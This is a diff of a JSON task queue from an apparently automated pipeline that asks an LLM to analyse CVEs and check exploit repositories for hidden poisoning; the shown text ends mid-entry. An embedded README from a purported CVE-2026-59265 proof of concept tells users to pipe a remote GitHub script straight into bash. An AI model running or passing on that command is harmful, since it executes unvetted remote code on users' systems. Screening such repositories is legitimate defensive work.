@@ -10,7 +10,7 @@
     "last_error": "API返回空结果",
     "created_at": 1790810415.5632799,
     "last_attempt": 1790950804.314124,
-    "next_attempt": 1791300918.7708924,
+    "next_attempt": 1791319301.9182076,
     "metadata": {},
     "task_id": "task_CVE-2026-93485_1790810415",
     "required_result_fields": [
@@ -39,7 +39,7 @@
     "last_error": "API返回空结果",
     "created_at": 1790824402.9941826,
     "last_attempt": 1790996463.4830768,
-    "next_attempt": 1791300913.6757638,
+    "next_attempt": 1791319301.53102,
     "metadata": {},
     "task_id": "task_CVE-2026-64560_1790824402",
     "required_result_fields": [
@@ -68,7 +68,7 @@
     "last_error": "API返回空结果",
     "created_at": 1790824407.7271366,
     "last_attempt": 1791198073.872342,
-    "next_attempt": 1791301017.8516912,
+    "next_attempt": 1791319408.942305,
     "metadata": {},
     "task_id": "task_CVE-2026-48500_1790824407",
     "required_result_fields": [
@@ -97,7 +97,7 @@
     "last_error": "API返回空结果",
     "created_at": 1790824412.5065958,
     "last_attempt": 1790996468.51717,
-    "next_attempt": 1791300919.0171661,
+    "next_attempt": 1791319308.3476644,
     "metadata": {},
     "task_id": "task_CVE-2026-59310_1790824412",
     "required_result_fields": [
@@ -126,7 +126,7 @@
     "last_error": "API返回空结果",
     "created_at": 1790824418.0543044,
     "last_attempt": 1790996463.4851696,
-    "next_attempt": 1791300938.4723055,
+    "next_attempt": 1791319298.5573156,
     "metadata": {},
     "task_id": "task_CVE-2026-59309_1790824418",
     "required_result_fields": [
@@ -155,7 +155,7 @@
     "last_error": "API返回空结果",
     "created_at": 1790824424.2008288,
     "last_attempt": 1790996468.5266137,
-    "next_attempt": 1791300923.676377,
+    "next_attempt": 1791319306.6348274,
     "metadata": {},
     "task_id": "task_CVE-2026-43499_1790824424",
     "required_result_fields": [
@@ -184,7 +184,7 @@
     "last_error": "API返回空结果",
     "created_at": 1790824430.0765982,
     "last_attempt": 1790996468.5282931,
-    "next_attempt": 1791300914.7918718,
+    "next_attempt": 1791319300.6343436,
     "metadata": {},
     "task_id": "task_CVE-2026-64561_1790824430",
     "required_result_fields": [
@@ -213,7 +213,7 @@
     "last_error": "API返回空结果",
     "created_at": 1790850924.3575613,
     "last_attempt": 1790996475.8277812,
-    "next_attempt": 1791300914.883352,
+    "next_attempt": 1791319295.5170043,
     "metadata": {},
     "task_id": "task_CVE-2025-54424_1790850924",
     "required_result_fields": [
@@ -242,7 +242,7 @@
     "last_error": "API返回空结果",
     "created_at": 1790850930.5053995,
     "last_attempt": 1790996475.8298469,
-    "next_attempt": 1791300918.6527169,
+    "next_attempt": 1791319306.3479295,
     "metadata": {},
     "task_id": "task_CVE-2025-8110_1790850930",
     "required_result_fields": [
@@ -271,7 +271,7 @@
     "last_error": "API返回空结果",
     "created_at": 1790874739.2358196,
     "last_attempt": 1790996468.5378242,
-    "next_attempt": 1791300922.2046409,
+    "next_attempt": 1791319285.1378512,
     "metadata": {},
     "task_id": "task_CVE-2026-24088_1790874739",
     "required_result_fields": [
@@ -300,7 +300,7 @@
     "last_error": "API返回空结果",
     "created_at": 1790892566.5759864,
     "last_attempt": 1790996468.5395572,
-    "next_attempt": 1791300937.7932243,
+    "next_attempt": 1791319296.3183665,
     "metadata": {},
     "task_id": "task_CVE-2026-42978_1790892566",
     "required_result_fields": [
@@ -329,7 +329,7 @@
     "last_error": "API返回空结果",
     "created_at": 1790892573.7138658,
     "last_attempt": 1790996463.494435,
-    "next_attempt": 1791300931.39919,
+    "next_attempt": 1791319285.9059832,
     "metadata": {},
     "task_id": "task_CVE-2026-41089_1790892573",
     "required_result_fields": [
@@ -358,7 +358,7 @@
     "last_error": "API返回空结果",
     "created_at": 1790906023.9133904,
     "last_attempt": 1790996470.8205857,
-    "next_attempt": 1791300933.525491,
+    "next_attempt": 1791319297.7690353,
     "metadata": {},
     "task_id": "task_CVE-2026-19553_1790906023",
     "required_result_fields": [
@@ -387,7 +387,7 @@
     "last_error": "API返回空结果",
     "created_at": 1790906028.9824386,
     "last_attempt": 1790996475.8391073,
-    "next_attempt": 1791300924.1590354,
+    "next_attempt": 1791319301.8280463,
     "metadata": {},
     "task_id": "task_CVE-2026-19445_1790906028",
     "required_result_fields": [
@@ -416,7 +416,7 @@
     "last_error": "API返回空结果",
     "created_at": 1790927147.2087271,
     "last_attempt": 1790996463.4961147,
-    "next_attempt": 1791300934.3612735,
+    "next_attempt": 1791319287.4501026,
     "metadata": {},
     "task_id": "task_CVE-2025-66398_1790927147",
     "required_result_fields": [
@@ -445,7 +445,7 @@
     "last_error": "API返回空结果",
     "created_at": 1790927153.8632917,
     "last_attempt": 1790996475.841207,
-    "next_attempt": 1791300910.8878903,
+    "next_attempt": 1791319315.4576895,
     "metadata": {},
     "task_id": "task_CVE-2026-20841_1790927153",
     "required_result_fields": [
@@ -474,7 +474,7 @@
     "last_error": "API返回空结果",
     "created_at": 1790927159.797143,
     "last_attempt": 1790996475.8498392,
-    "next_attempt": 1791300911.9449167,
+    "next_attempt": 1791319302.132419,
     "metadata": {},
     "task_id": "task_CVE-2026-24061_1790927159",
     "required_result_fields": [
@@ -503,7 +503,7 @@
     "last_error": "API返回空结果",
     "created_at": 1790950781.6130583,
     "last_attempt": 1790996463.504616,
-    "next_attempt": 1791300928.304993,
+    "next_attempt": 1791319308.018058,
     "metadata": {},
     "task_id": "task_CVE-2026-31431_1790950781",
     "required_result_fields": [
@@ -532,7 +532,7 @@
     "last_error": "API返回空结果",
     "created_at": 1790950788.3039005,
     "last_attempt": 1790996475.851742,
-    "next_attempt": 1791300913.2878182,
+    "next_attempt": 1791319300.437892,
     "metadata": {},
     "task_id": "task_CVE-2026-31802_1790950788",
     "required_result_fields": [
@@ -561,7 +561,7 @@
     "last_error": "API返回空结果",
     "created_at": 1790950793.1916378,
     "last_attempt": 1791037714.9560301,
-    "next_attempt": 1791300936.8668544,
+    "next_attempt": 1791319307.7210112,
     "metadata": {},
     "task_id": "task_CVE-2026-45805_1790950793",
     "required_result_fields": [
@@ -590,7 +590,7 @@
     "last_error": "API返回空结果",
     "created_at": 1790950799.3038085,
     "last_attempt": 1791198045.5901802,
-    "next_attempt": 1791300936.6772628,
+    "next_attempt": 1791319296.828403,
     "metadata": {},
     "task_id": "task_CVE-2026-40281_1790950799",
     "required_result_fields": [
@@ -619,7 +619,7 @@
     "last_error": "API返回空结果",
     "created_at": 1790950804.7404652,
     "last_attempt": 1791198045.5923471,
-    "next_attempt": 1791300930.7152474,
+    "next_attempt": 1791319298.4874268,
     "metadata": {},
     "task_id": "task_CVE-2026-42589_1790950804",
     "required_result_fields": [
@@ -648,7 +648,7 @@
     "last_error": "API返回空结果",
     "created_at": 1790970054.0784676,
     "last_attempt": 1791052030.3100364,
-    "next_attempt": 1791300934.368313,
+    "next_attempt": 1791319298.3052528,
     "metadata": {},
     "task_id": "task_CVE-2026-86950_1790970054",
     "required_result_fields": [
@@ -677,7 +677,7 @@
     "last_error": "API返回空结果",
     "created_at": 1790970059.8283787,
     "last_attempt": 1791198054.3765848,
-    "next_attempt": 1791300925.2139966,
+    "next_attempt": 1791319302.4750633,
     "metadata": {},
     "task_id": "task_CVE-2026-57827_1790970059",
     "required_result_fields": [
@@ -706,7 +706,7 @@
     "last_error": "API返回空结果",
     "created_at": 1790970064.8535693,
     "last_attempt": 1791037714.9573836,
-    "next_attempt": 1791300912.731429,
+    "next_attempt": 1791319296.045237,
     "metadata": {},
     "task_id": "task_CVE-2026-45585_1790970064",
     "required_result_fields": [
@@ -735,7 +735,7 @@
     "last_error": "API返回空结果",
     "created_at": 1790983575.4018836,
     "last_attempt": 1791198040.5829563,
-    "next_attempt": 1791300932.504553,
+    "next_attempt": 1791319297.6181939,
     "metadata": {},
     "task_id": "task_CVE-2026-81000_1790983575",
     "required_result_fields": [
@@ -764,7 +764,7 @@
     "last_error": "API返回空结果",
     "created_at": 1790996438.4147103,
     "last_attempt": 1791198045.6036413,
-    "next_attempt": 1791300924.1165826,
+    "next_attempt": 1791319307.022549,
     "metadata": {},
     "task_id": "task_CVE-2026-9558_1790996438",
     "required_result_fields": [
@@ -793,7 +793,7 @@
     "last_error": "API返回空结果",
     "created_at": 1790996470.814545,
     "last_attempt": 1791052030.3116221,
-    "next_attempt": 1791300922.6071565,
+    "next_attempt": 1791319291.8521862,
     "metadata": {},
     "task_id": "task_CVE-2026-88771_1790996470",
     "required_result_fields": [
@@ -822,7 +822,7 @@
     "last_error": "API返回空结果",
     "created_at": 1790996476.0245373,
     "last_attempt": 1791198054.3791745,
-    "next_attempt": 1791300931.2868145,
+    "next_attempt": 1791319291.7747483,
     "metadata": {},
     "task_id": "task_CVE-2026-88772_1790996476",
     "required_result_fields": [
@@ -851,7 +851,7 @@
     "last_error": "API返回空结果",
     "created_at": 1791052020.5915668,
     "last_attempt": 1791198045.6057465,
-    "next_attempt": 1791300935.202089,
+    "next_attempt": 1791319308.1140447,
     "metadata": {},
     "task_id": "task_CVE-2025-21065_1791052020",
     "required_result_fields": [
@@ -880,7 +880,7 @@
     "last_error": "API返回空结果",
     "created_at": 1791052025.3025782,
     "last_attempt": 1791198054.3909612,
-    "next_attempt": 1791300909.0795,
+    "next_attempt": 1791319303.9461265,
     "metadata": {},
     "task_id": "task_CVE-2025-24257_1791052025",
     "required_result_fields": [
@@ -909,7 +909,7 @@
     "last_error": "API返回空结果",
     "created_at": 1791052030.604131,
     "last_attempt": 1791198054.3931735,
-    "next_attempt": 1791300917.4252026,
+    "next_attempt": 1791319295.606249,
     "metadata": {},
     "task_id": "task_CVE-2026-2472_1791052030",
     "required_result_fields": [
@@ -938,7 +938,7 @@
     "last_error": "API返回空结果",
     "created_at": 1791072907.7281036,
     "last_attempt": 1791198045.616099,
-    "next_attempt": 1791300913.2358303,
+    "next_attempt": 1791319292.7323043,
     "metadata": {},
     "task_id": "task_CVE-2026-53787_1791072907",
     "required_result_fields": [
@@ -967,7 +967,7 @@
     "last_error": "API返回空结果",
     "created_at": 1791118660.5202231,
     "last_attempt": 1791198054.4040086,
-    "next_attempt": 1791300919.4071023,
+    "next_attempt": 1791319292.3400695,
     "metadata": {},
     "task_id": "task_CVE-2026-96451_1791118660",
     "required_result_fields": [
@@ -996,7 +996,7 @@
     "last_error": "API返回空结果",
     "created_at": 1791198049.3692577,
     "last_attempt": 1791248584.2703993,
-    "next_attempt": 1791300878.3390684,
+    "next_attempt": 1791319262.014093,
     "metadata": {},
     "task_id": "task_CVE-2025-14847_1791198049",
     "required_result_fields": [
@@ -1025,7 +1025,7 @@
     "last_error": "API返回空结果",
     "created_at": 1791198061.629603,
     "last_attempt": 1791248599.2791116,
-    "next_attempt": 1791300885.5170975,
+    "next_attempt": 1791319266.355162,
     "metadata": {},
     "task_id": "task_CVE-2025-54769_1791198061",
     "required_result_fields": [
@@ -1054,7 +1054,7 @@
     "last_error": "API返回空结果",
     "created_at": 1791198068.8562088,
     "last_attempt": 1791248599.2815304,
-    "next_attempt": 1791300875.7488456,
+    "next_attempt": 1791319257.6216953,
     "metadata": {},
     "task_id": "task_CVE-2025-55182_1791198068",
     "required_result_fields": [
@@ -1083,7 +1083,7 @@
     "last_error": "API返回空结果",
     "created_at": 1791248604.5986373,
     "last_attempt": 1791300863.646469,
-    "next_attempt": 1791300901.89247,
+    "next_attempt": 1791319258.7595768,
     "metadata": {},
     "task_id": "task_CVE-2025-49844_1791248604",
     "required_result_fields": [
@@ -1104,15 +1104,15 @@
   {
     "cve_id": "CVE-2026-59265",
     "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2026-59265\", \"sources\": [\"NVD\", \"OSCS\"], \"descriptions\": [\"A code execution issue in the Java integration in Apache OpenOffice v4.1.16 and earlier allows a crafted untrusted document to trigger executing arbitrary (even remote) code when opened by the user.\\n\\n\\n\\nThis issue is expected to be fixed in version 4.1.17, which is in the release candidate phase.\\n\\n\\n\\nUntil then, users can mitigate this issue by disabling Java runtime integration in the Preferences dialog. This prevents the attack. If this is not possible, or as an extra precaution, you can avoid opening\\u00a0open untrusted files entirely.\\u00a0Once 4.1.17 is released, upgrade to that version to fix the issue.\", \"\\u6807\\u9898: Apache OpenOffice \\u4ee3\\u7801\\u6267\\u884c\\u6f0f\\u6d1e\"], \"published_date\": \"2026-10-02T18:17:03.917\", \"last_modified_date\": \"2026-10-06T14:17:45.660\", \"cvss_score\": 8.8, \"severity\": \"HIGH\", \"references\": [\"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \"h\", \"u\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"a\", \"p\", \"a\", \"c\", \"h\", \"e\", \"/\", \"o\", \"p\", \"e\", \"n\", \"o\", \"f\", \"f\", \"i\", \"c\", \"e\", \"/\", \"c\", \"o\", \"m\", \"m\", \"i\", \"t\", \"/\", \"9\", \"5\", \"9\", \"2\", \"3\", \"f\", \"d\", \"4\", \"3\", \"7\", \"e\", \"0\", \"6\", \"e\", \"d\", \"d\", \"3\", \"8\", \"a\", \"4\", \"f\", \"0\", \"e\", \"1\", \"3\", \"9\", \"a\", \"2\", \"7\", \"c\", \"7\", \"5\", \"5\", \"a\", \"6\", \"f\", \"3\", \"b\", \"a\", \"6\", \".\", \"p\", \"a\", \"t\", \"c\", \"h\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \"h\", \"u\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"a\", \"p\", \"a\", \"c\", \"h\", \"e\", \"/\", \"o\", \"p\", \"e\", \"n\", \"o\", \"f\", \"f\", \"i\", \"c\", \"e\", \"/\", \"c\", \"o\", \"m\", \"m\", \"i\", \"t\", \"/\", \"c\", \"6\", \"9\", \"9\", \"b\", \"e\", \"d\", \"3\", \"f\", \"7\", \"5\", \"e\", \"7\", \"9\", \"b\", \"d\", \"6\", \"4\", \"d\", \"d\", \"e\", \"c\", \"9\", \"d\", \"e\", \"c\", \"4\", \"9\", \"f\", \"9\", \"e\", \"2\", \"1\", \"0\", \"e\", \"e\", \"d\", \"2\", \"8\", \"1\", \".\", \"p\", \"a\", \"t\", \"c\", \"h\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \".\", \"a\", \"p\", \"a\", \"c\", \"h\", \"e\", \".\", \"o\", \"r\", \"g\", \"/\", \"t\", \"h\", \"r\", \"e\", \"a\", \"d\", \".\", \"h\", \"t\", \"m\", \"l\", \"/\", \"s\", \"v\", \"f\", \"d\", \"c\", \"1\", \"j\", \"t\", \"p\", \"q\", \"l\", \"w\", \"7\", \"m\", \"o\", \"6\", \"l\", \"g\", \"g\", \"9\", \"f\", \"t\", \"h\", \"c\", \"m\", \"f\", \"7\", \"5\", \"4\", \"p\", \"l\", \"5\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"1\", \"0\", \"/\", \"0\", \"2\", \"/\", \"2\"]}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] CVE-2026-59265: version 4.1.17 Security Vulnerability ...\n [description] 4 days ago · [No Public PoC] CVE-2026-59265 affecting version 4.1.17 is a Info severity flaw (CVSS 0). A code execution issue in the Java integration in Apache OpenOffice v4.1.16 and earlier allows a... Technical threat analysis, CVSS breakdown, and vendor patch guidance.\n [link] https://www.thehackerwire.com/vulnerability/CVE-2026-59265/\n [webpage 0 end]\n[webpage 1 begin] [title] CVE-2026-59265 - Vulnerability Details - OpenCVE\n [description] 4 days ago · The vulnerability can be exploited when a user opens a malicious document; based on the description, the likely attack vector is local and requires user interaction to open the file, but this is inferred rather than explicitly stated.\n [link] https://app.opencve.io/cve/CVE-2026-59265\n [webpage 1 end]\n[webpage 2 begin] [title] CVE-2026-59265 - Exploits & Severity - Feedly\n [description] 4 days ago · Oct 2, 2026 at 11:31 AM Threat intelligence report A critical vulnerability in Apache OpenOffice allows arbitrary code execution through spreadsheet files that can silently execute attacker-supplied Java code via the \"database range\" feature, with proof-of-concept demonstrations available.\n [link] https://feedly.com/cve/CVE-2026-59265\n [webpage 2 end]\n[webpage 3 begin] [title] CVE-2026-59265 - Apache OpenOffice, Apache OpenOffice ...\n [description] 4 days ago · Oct. 2, 2026, 6:17 p.m. Last Modified : Oct. 3, 2026, 4:18 a.m. Remotely Exploit : No Source : [email protected] Impact Affected Products The following products are affected by CVE-2026-59265 vulnerability. Even if cvefeed.io is aware of the exact versions of the products that are affected, the information is not represented in the table below.\n [link] https://cvefeed.io/vuln/detail/CVE-2026-59265\n [webpage 3 end]\n[webpage 4 begin] [title] CVE-2026-59265: Apache OpenOffice Untrusted Search Path\n [description] 3 days ago · CVE-2026-59265 is a CVSS 8.8 Untrusted Search Path vulnerability in Apache OpenOffice. Includes technical details, affected versions, and mitigation steps.\n [link] https://cvetodo.com/cve/CVE-2026-59265\n [webpage 4 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/9dbf90d6ff5382383030219fdff83bb4/LICENSE\n---\nSECURITY RESEARCH LICENSE (SRL-1.0)\n\nCopyright (c) 2026\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to use,\ncopy, modify, and distribute the Software, subject to the following conditions:\n\n---\n\n## 1. Permitted Use\n\nThe Software is provided solely for:\n\n- Educational purposes\n- Academic research\n- Controlled cybersecurity testing\n- Vulnerability analysis in isolated environments\n- Defensive security improvement and learning\n\nUse is permitted only in environments where the user has explicit authorization.\n\n---\n\n## 2. Strict Prohibitions\n\nYou MAY NOT use this Software for any of the following:\n\n- Unauthorized access to systems, networks, or services\n- Exploitation of production or live environments\n- Malicious hacking, intrusion, or data exfiltration\n- Illegal, unethical, or harmful activities of any kind\n- Any activity that violates applicable local, national, or international laws\n\nAny such use is strictly outside the scope of this license.\n\n---\n\n## 3. No Warranty\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,\nINCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A\nPARTICULAR PURPOSE, AND NONINFRINGEMENT.\n\nIN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE FOR ANY CLAIM, DAMAGES,\nOR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT, OR OTHERWISE,\nARISING FROM, OUT OF, OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER\nDEALINGS IN THE SOFTWARE.\n\n---\n\n## 4. Limitation of Liability\n\nThe author and contributors of this Software:\n\n- Are NOT responsible for any misuse of the Software\n- Are NOT liable for any damages, losses, or legal consequences\n- Do NOT endorse or authorize any illegal or malicious use\n- Accept NO responsibility for how the Software is used, modified, or distributed\n\nUsers are solely responsible for their actions and compliance with applicable laws.\n\n---\n\n## 5. Security Research Disclaimer\n\nThis Software is intended exclusively for security research and defensive purposes.\nIt is designed to help understand vulnerabilities and improve system security.\n\nIt must NOT be used against systems without explicit written permission.\n\n---\n\n## 6. Responsibility of the User\n\nBy using this Software, you agree that:\n\n- You are legally authorized to perform all testing activities\n- You will use the Software only in controlled environments\n- You will comply with all applicable laws and regulations\n- You assume full responsibility for any consequences of your use\n\n---\n\n## 7. Termination of Use\n\nAny violation of this license automatically terminates your rights to use,\nmodify, or distribute the Software.\n\n---\n\n## 8. Final Statement\n\nThis Software is provided for ethical cybersecurity research only.\nAny misuse is strictly prohibited and is solely the responsibility of the user.\n\n---\n/tmp/9dbf90d6ff5382383030219fdff83bb4/README.md\n---\n# cve-id\n\n## Donate\n\n<table>\n  <tr>\n    <td valign=\"top\" width=\"65%\">\n      <h3>Help maintain this project</h3>\n      <p>If you find this project useful, please consider supporting its ongoing maintenance through PayPal or ABA Mobile.</p>\n      <p>❤️ <strong>១០% នៃការបរិច្ចាគរបស់អ្នក នឹងត្រូវបានបរិច្ចាគជូនមន្ទីរពេទ្យគន្ធបុប្ផា។</strong></p>\n      <p>❤️ <strong>Ten percent of every donation is contributed to Kantha Bopha Children's Hospital.</strong></p>\n    </td>\n    <td align=\"center\" valign=\"top\" width=\"35%\">\n      <strong>Choose a payment method</strong>\n      <br><br>\n      <a href=\"https://www.paypal.com/donate/?hosted_button_id=GHBZLGLY76KNA\">\n        <img src=\"https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif\" alt=\"Donate securely with PayPal\">\n      </a>\n      <br><br>\n      <a href=\"https://raw.githubusercontent.com/HORKimhab/awesome-cybersecurity-resources/refs/heads/main/data/images/aba-merchant-hkimhab.jpeg\">\n        <img src=\"https://raw.githubusercontent.com/HORKimhab/awesome-cybersecurity-resources/refs/heads/main/data/images/aba-merchant-hkimhab.jpeg\" alt=\"ABA Mobile donation QR code\" height=\"180\">\n      </a>\n      <br>\n      <sub>Scan with ABA Mobile · Click to enlarge</sub>\n    </td>\n  </tr>\n</table>\n\n## ⚡ Simple Usage\n\nRun the latest version of the external download script directly from GitHub:\n\n```bash\nbash <(curl -fsSL https://raw.githubusercontent.com/HORKimhab/collection-scripts/main/get-svn.sh)\n```\n\n> This command requires Bash and `curl`. Review the remote script before running it if you do not trust the source.\n\nUse this project only in safe and authorized environments such as:\n\n- Local virtual machines\n- Docker containers\n- Isolated lab setups\n- Authorized penetration testing environments\n\nExample setup:\n\n```bash\ngit clone <repository-url>\ncd <repository-name>\n\n# Project use python follow below\n\n# Create a virtual environment\npython -m venv venv\n\n# Activate the virtual environment\n\n# macOS / Linux\nsource venv/bin/activate\n\n\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
-    "retry_count": 1,
+    "retry_count": 2,
     "max_retries": 5,
     "priority": 2,
     "status": "pending",
     "error_type": "client_error",
     "last_error": "API返回空结果",
     "created_at": 1791300864.5315979,
-    "last_attempt": 1791300869.539925,
-    "next_attempt": 1791300880.8251565,
+    "last_attempt": 1791319230.1277306,
+    "next_attempt": 1791319252.5495534,
     "metadata": {},
     "task_id": "task_CVE-2026-59265_1791300864",
     "required_result_fields": [
@@ -1133,17 +1133,75 @@
   {
     "cve_id": "CVE-2026-63277",
     "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2026-63277\", \"sources\": [\"NVD\", \"OSCS\"], \"descriptions\": [\"LibreOffice Calc can link a cell range to an external data source, and the link is saved in the document. A document could name a Java database driver for such a link to be loaded from a remote location, so opening the document could run Java code from that location. In fixed versions an entry in a Java class path has to be a file URL.\", \"\\u6807\\u9898: LibreOffice JDBC\\u4ee3\\u7801\\u6267\\u884c\"], \"published_date\": \"2026-10-05T12:17:11.253\", \"last_modified_date\": \"2026-10-06T15:03:59.427\", \"cvss_score\": null, \"severity\": null, \"references\": [\"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"l\", \"i\", \"b\", \"r\", \"e\", \"o\", \"f\", \"f\", \"i\", \"c\", \"e\", \".\", \"o\", \"r\", \"g\", \"/\", \"a\", \"b\", \"o\", \"u\", \"t\", \"-\", \"u\", \"s\", \"/\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"a\", \"d\", \"v\", \"i\", \"s\", \"o\", \"r\", \"i\", \"e\", \"s\", \"/\", \"c\", \"v\", \"e\", \"-\", \"2\", \"0\", \"2\", \"6\", \"-\", \"6\", \"3\", \"2\", \"7\", \"7\"]}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] LibreOffice Calc Vulnerability CVE-2026-63277: PoC Out\n [description] 15 hours ago · PoC released for LibreOffice Calc vulnerability CVE-2026-63277, which runs code when a file opens. Five more flaws fixed. Upgrade to 26.2.5.\n [link] https://securityonline.info/libreoffice-calc-vulnerability-cve-2026-63277-poc/\n [webpage 0 end]\n[webpage 1 begin] [title] CVE-2026-63277 - Exploits & Severity - Feedly\n [description] 1 day ago · The Document Foundation has fixed six flaws in LibreOffice, led by CVE-2026-63277, a LibreOffice Calc vulnerability that runs attacker code when a user opens a spreadsheet.\n [link] https://feedly.com/cve/CVE-2026-63277\n [webpage 1 end]\n[webpage 2 begin] [title] Exploit-Index: The Ultimate CVE Proof of ... - GitHub\n [description] 3 days ago · The Ultimate CVE Proof of Concept (PoC) & Exploit Database. A zero-API, high-performance aggregator for 0days, vulnerabilities, and Threat Intelligence. Replacing manual searches for elite SOC ...\n [link] https://github.com/SecureWithUmer/Exploit-Index\n [webpage 2 end]\n[webpage 3 begin] [title] CVE-2026-63277: LibreOffice Vulnerability (CVSS 8.5) | CVETodo\n [description] 1 day ago · CVE-2026-63277 is a CVSS 8.5 high-severity vulnerability in LibreOffice. Includes technical details, affected versions, and mitigation steps.\n [link] https://cvetodo.com/cve/CVE-2026-63277\n [webpage 3 end]\n[webpage 4 begin] [title] CVE-2026-63277 Document Foundation LibreOffice Java Database ...\n [description] 1 day ago · A vulnerability was detected in Document Foundation LibreOffice up to 26.2.4. This vulnerability is reported as CVE-2026-63277. It is suggested to upgrade the affected component.\n [link] https://vuldb.com/vuln/413593\n [webpage 4 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/e335dee0979098f0da5f89c7ad84ce41/LICENSE\n---\nSECURITY RESEARCH LICENSE (SRL-1.0)\n\nCopyright (c) 2026\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to use,\ncopy, modify, and distribute the Software, subject to the following conditions:\n\n---\n\n## 1. Permitted Use\n\nThe Software is provided solely for:\n\n- Educational purposes\n- Academic research\n- Controlled cybersecurity testing\n- Vulnerability analysis in isolated environments\n- Defensive security improvement and learning\n\nUse is permitted only in environments where the user has explicit authorization.\n\n---\n\n## 2. Strict Prohibitions\n\nYou MAY NOT use this Software for any of the following:\n\n- Unauthorized access to systems, networks, or services\n- Exploitation of production or live environments\n- Malicious hacking, intrusion, or data exfiltration\n- Illegal, unethical, or harmful activities of any kind\n- Any activity that violates applicable local, national, or international laws\n\nAny such use is strictly outside the scope of this license.\n\n---\n\n## 3. No Warranty\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR 